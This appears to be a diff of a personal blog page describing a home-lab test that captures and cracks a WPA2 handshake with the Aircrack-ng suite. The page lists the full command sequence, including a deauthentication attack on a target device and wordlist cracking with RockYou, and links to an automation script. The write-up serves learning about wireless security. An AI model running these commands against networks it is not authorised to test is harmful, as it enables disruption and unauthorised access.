@@ -2,7 +2,7 @@
 <html>
     <head>
         <link rel="stylesheet" type="text/css" href="../style.css">
-        <title>Aircrack-ng Suite</title>
+        <title>Aircrack-NG Suite</title>
     </head>
     <body>
           <div class="dropdown">
@@ -19,33 +19,50 @@
                <!-- This list is empty on this page because there are no more writeups as of now -->
             </div>
           </div> 
-        <div class=blogpost>
-        <h2>Aircrack-ng Suite</h2>
-        <h4>Date: 12/7/2021</h4>
-        <p>For this test I attempted to capture and crack a WPA Handshake on my home network using the tools mentioned.</p>
-        <h4>Steps Taken:</h4>
-        <ol><li>I put my Network Interface into monitor mode</li>
-            <li>I used Airmon-ng with no arguments to get basic information about nearby networks. </li>
-            <li> I started monitoring traffic so that the WPA handshake would be captured the next time someone connects to the router.</li>
-            <li>For testing purposes, I choose to de-authenticate* my phone from the network.</li>
-            <li>The handshake was captured, so I was able to stop monitoring. I chose to search the RockYou Wordlist for a matching hash to the one I'd captured.</li>
+        <div class="blogpost">
+        <h2>Aircrack-NG Suite</h2>
+        <div class="row">
+          <div class="column left">
+            <div class="blogtext">
+              <h4>Date: 12/7/2021 (Updated 5/10/2022)</h4>
+              <br>
+              <p>For this test I attempted to capture and crack a WPA Handshake on my home network using the tools in question.</p>
+              <h4>Steps Taken:</h4>
+              <ol><li>I put my Network Interface into monitor mode</li>
+                  <li>I used Airmon-ng with no arguments to get basic information about nearby networks. </li>
+                  <li> I started monitoring traffic so that the WPA handshake would be captured the next time someone connects to the router.</li>
+                  <li>For testing purposes, I choose to de-authenticate my phone from the network.</li>
+                  <li>The handshake was captured, so I was able to stop monitoring. I chose to search the RockYou Wordlist for a matching hash to the one I'd captured.</li>
+              </ol>
+              <br>
+          <h4>Variables:</h4>
+      <p>ACCESSPOINTMAC: The BSSID/MAC Address of the target network in question</p>
+      <p>CAPTUREFILE: The project name that you want to save your capture files under</p>
+      <p>NIC: The name of your Network Adapter</p>
+      <p>NICMON: Same as previous with mon appended to it</p>
+      <p>TARGET: The MAC Address of the device you want to de-authenticate</p>
+      <br>
+      <h4>Commands Used:</h4>
+       <ol>
+           <li>sudo airmon-ng start NIC </li>
+          <li>sudo airodump-ng NICMON</li>
+          <li>sudo airodump-ng -c 6 -w CAPTUREFILE --bssid ACCESSPOINTMAC NICMON</li>
+          <li>sudo aireplay-ng --deauth 2 -a ACCESSPOINTMAC -k TARGET NICMON</li>
+          <li>sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt CAPTUREFILE.cap</li>
         </ol>
-    <h4>Variables:</h4>
-<p>ACCESSPOINTMAC: The BSSID/MAC Address of the target network in question</p>
-<p>CAPTUREFILE: The project name that you want to save your capture files under</p>
-<p>NIC: The name of your Network Adapter</p>
-<p>NICMON: Same as previous with mon appended to it</p>
-<p>TARGET: The MAC Address of the device you want to de-authenticate</p>
-<h4>Commands:</h4>
- <ol>
-     <li>sudo airmon-ng start NIC </li>
-    <li>sudo airodump-ng NICMON</li>
-    <li>sudo airodump-ng -c 6 -w CAPTUREFILE --bssid ACCESSPOINTMAC NICMON</li>
-    <li>sudo aireplay-ng --deauth 2 -a ACCESSPOINTMAC -k TARGET NICMON</li>
-    <li>
-        sudo aircrack-ng -w /path/to/rockyou.txt CAPTUREFILE.cap</li>
-<p>Conclusion: The Aircrack-ng Suite is fairly easy to use for those with basic knowledge of networking, and I decided to write a bash script to automate its use. <br> <br> <a class="scriptlink" href="https://github.com/hastalapasta/WPA2_HCA">WPA2 HCA</a></p>
-</ol>
+      <br>
+      <p>Conclusion: The Aircrack-ng Suite is fairly easy to use for those with basic knowledge of networking and performs as expected. I've published a bash script that automates the actions taken in this test. <br> <br> <br> </p> 
+      </div>
+          </div>
+          <div class="column right">
+            <img src="../images/write-ups/Aircrack_1/airodump.png" alt="Airodump">
+            <figcaption>Airodump-NG capturing packets from the target network</figcaption>
+            <img src="../images/write-ups/Aircrack_1/aircrack_pwd.png" alt="Aircrack">
+            <figcaption>Aircrack attempting to match the captured hash to one in the wordlist</figcaption>
+          </div>
+        </div>
+        <a class="scriptlink" href="https://github.com/hastalapasta/WPA2_HCA" target="_blank" rel="noopener noreferrer">WPA2 Handshake Capturing/Cracking Automation Script</a>
+        </div>       
 </div>
 </body>
 </html>
